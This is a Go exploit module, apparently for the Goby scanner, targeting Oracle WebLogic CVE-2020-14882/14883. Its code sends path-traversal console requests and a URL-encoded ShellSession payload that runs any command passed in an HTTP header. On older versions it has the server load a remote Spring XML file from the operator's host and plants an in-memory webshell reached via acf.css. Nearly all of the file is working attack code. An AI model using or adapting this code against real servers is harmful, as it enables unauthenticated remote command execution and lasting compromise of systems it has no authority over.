package exploits

import (
  "errors"
  "git.gobies.org/goby/goscanner/godclient"
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "net/url"
  "regexp"
  "strings"
)

func init() {
  expJson := `{
    "Name": "WebLogic Privilege Escalation Vulnerability (CVE-2020-14883)",
    "Description": "<p>WebLogic is an application server produced by the American company Oracle, specifically, it is a middleware based on the JAVA EE architecture. WebLogic is a Java application server used for developing, integrating, deploying, and managing large-scale distributed web applications, network applications, and database applications.</p><p>WebLogic has a privilege escalation vulnerability, which allows attackers to take over the WebLogic Server Console without authorization or control server permissions, bypassing authentication.</p>",
    "Product": "Weblogic_interface_7001",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2021-09-09",
    "Author": "Chin",
    "FofaQuery": "(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "GobyQuery": "(title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "Level": "3",
    "Impact": "<p>WebLogic has a privilege escalation vulnerability, which allows attackers to take over the WebLogic Server Console without authorization or control server permissions, bypassing authentication.</p>",
    "Recommendation": "<p>The vendor has released a vulnerability patch, please pay attention to updates in a timely manner: <a href=\"https://www.oracle.com/middleware/technologies/weblogic.html\">https://www.oracle.com/middleware/technologies/weblogic.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackMode",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackMode=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "Command Execution"
    ],
    "VulType": [
        "Command Execution",
        "Permission Bypass"
    ],
    "CNNVD": [
        "CNNVD-202010-1008",
        "CNNVD-202010-997"
    ],
    "CNVD": [
        "CNVD-2020-59715",
        "CNVD-2020-70267"
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CVEIDs": [
        "CVE-2020-14882",
        "CVE-2020-14883"
    ],
    "Translation": {
        "CN": {
            "Name": "Weblogic 权限绕过漏洞（CVE-2020-14883）",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p><p>WebLogic存在权限绕过漏洞，攻击者可以在绕过身份验证的情况下直接接管 WebLogic Server Console 未授权访问后台或控制服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.oracle.com/middleware/technologies/weblogic.html\">https://www.oracle.com/middleware/technologies/weblogic.html</a><br></p>",
            "Impact": "<p>WebLogic存在权限绕过漏洞，攻击者可以在绕过身份验证的情况下直接接管 WebLogic Server Console 未授权访问后台或控制服务器权限。<br></p>",
            "VulType": [
                "权限绕过",
                "命令执行"
            ],
            "Tags": [
                "权限绕过",
                "命令执行"
            ]
        },
        "EN": {
            "Name": "WebLogic Privilege Escalation Vulnerability (CVE-2020-14883)",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic is an application server produced by the American company Oracle, specifically, it is a middleware based on the JAVA EE architecture. WebLogic is a Java application server used for developing, integrating, deploying, and managing large-scale distributed web applications, network applications, and database applications.</p><p>WebLogic has a privilege escalation vulnerability, which allows attackers to take over the WebLogic Server Console without authorization or control server permissions, bypassing authentication.</p>",
            "Recommendation": "<p>The vendor has released a vulnerability patch, please pay attention to updates in a timely manner: <a href=\"https://www.oracle.com/middleware/technologies/weblogic.html\" target=\"_blank\">https://www.oracle.com/middleware/technologies/weblogic.html</a><br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">WebLogic has a privilege escalation vulnerability, which allows attackers to take over the WebLogic Server Console without authorization or control server permissions, bypassing authentication.</span><br></p>",
            "VulType": [
                "Command Execution",
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "Command Execution"
            ]
        }
    },
    "PocId": "10775"
}`
  getVersioneHGAJ4ly := func(u *httpclient.FixUrl) (string, error) {
    uri := "/console/login/LoginForm.jsp"
    requestConfig := httpclient.NewGetRequestConfig(uri)
    requestConfig.VerifyTls = false
    requestConfig.FollowRedirect = true
    resp, err := httpclient.DoHttpRequest(u, requestConfig)
    if err != nil {
      return "", err
    }
    // 提取正则
    matches := regexp.MustCompile(`<p id="footerVersion">.+([\d\.]+)</p>`).FindStringSubmatch(resp.Utf8Html)
    if len(matches) > 0 {
      if version := regexp.MustCompile(`[\d\.]+`).FindString(matches[0]); version != "" {
        return version, nil
      }
    }
    return "", errors.New("版本提取失败")
  }

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      payload := `?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String(%22ahihi%22)`
      uris := []string{`/console/css/%25%32%65%25%32%65%25%32%66console.portal`,
        `/console/images/%25%32%65%25%32%65%25%32%66console.portal`,
        `/console/images/%252E./console.portal`,
        `/console/css/%252E./console.portal`,
        `/console/images/%252E%252E/console.portal`, `/console/css/%252E%252E/console.portal`}
      for _, uri := range uris {
        uri = uri + payload
        rceGet := httpclient.NewGetRequestConfig(uri)
        rceGet.VerifyTls = false
        rceGet.FollowRedirect = false
        if resp, err := httpclient.DoHttpRequest(u, rceGet); err == nil && resp != nil &&
          (resp.StatusCode == 200 && strings.Contains(resp.RawBody, "console.pageHelpURL") && strings.Contains(resp.RawBody, "console.recordState")) || (resp.StatusCode == 302 && strings.Contains(resp.RawBody, "/console/jsp/common/NoJMX.jsp")) {
          ss.VulURL = u.FixedHostInfo + uri
          return true
        }
      }
      return false
    },
    func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      attackMode := goutils.B2S(stepLogs.Params["attackMode"])
      if attackMode != "cmd" {
        expResult.Success = false
        expResult.Output = "未知到利用方式"
        return expResult
      }
      payloads := []string{`?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt();%27)`}
      // 提取版本号
      version, err := getVersioneHGAJ4ly(expResult.HostInfo)
      lowerVersion := false
      if err != nil {
        // 低版本
        xmlUrl := godclient.GodServerAddr + "/ps/weblogic/springBeanMemoryCmd.xml"
        payloads = append(payloads, `?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("` + xmlUrl + `")`)
      } else if strings.HasPrefix(version, "10.3.") || strings.HasPrefix(version, "12.1.") {
        // 低版本
        xmlUrl := godclient.GodServerAddr + "/ps/weblogic/springBeanMemoryCmd.xml"
        payloads = []string{`?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("` + xmlUrl + `")`}
        lowerVersion = true
      }
      uris := []string{`/console/css/%25%32%65%25%32%65%25%32%66console.portal`,
        `/console/images/%25%32%65%25%32%65%25%32%66console.portal`,
        `/console/images/%252E./console.portal`,
        `/console/css/%252E./console.portal`,
        `/console/images/%252E%252E/console.portal`, `/console/css/%252E%252E/console.portal`}
      cmd := goutils.B2S(stepLogs.Params["cmd"])
      for _, uri := range uris {
        for _, payload := range payloads {
          uri += payload
          requestConfig := httpclient.NewGetRequestConfig(uri)
          requestConfig.VerifyTls = false
          requestConfig.FollowRedirect = false
          // 低版本去掉 Header 执行
          if !lowerVersion || strings.Contains(payload, "FileSystemXmlApplicationContext") {
            requestConfig.Header.Store("cmd", cmd)
          }
          resp, err := httpclient.DoHttpRequest(expResult.HostInfo, requestConfig)
          if err != nil || resp == nil || (resp != nil && resp.StatusCode != 200) {
            continue
          }
          // 低版本执行内存马
          if lowerVersion {
            for _, payloadURL := range []string{"/consolehelp/css/acf.css", "/console/css/acf.css"} {
              // 执行命令 cmd =
              resp, err = httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + payloadURL + "?cmd=" + url.QueryEscape(cmd))
              if err != nil || resp.StatusCode == 404 {
                continue
              } else {
                expResult.Success = true
                expResult.Output = resp.Utf8Html
                return expResult
              }
            }
          } else {
            expResult.Success = true
            expResult.Output = resp.Utf8Html
            return expResult
          }
        }
      }
      expResult.Success = false
      expResult.Output = ""
      return expResult
    },
  ))
}
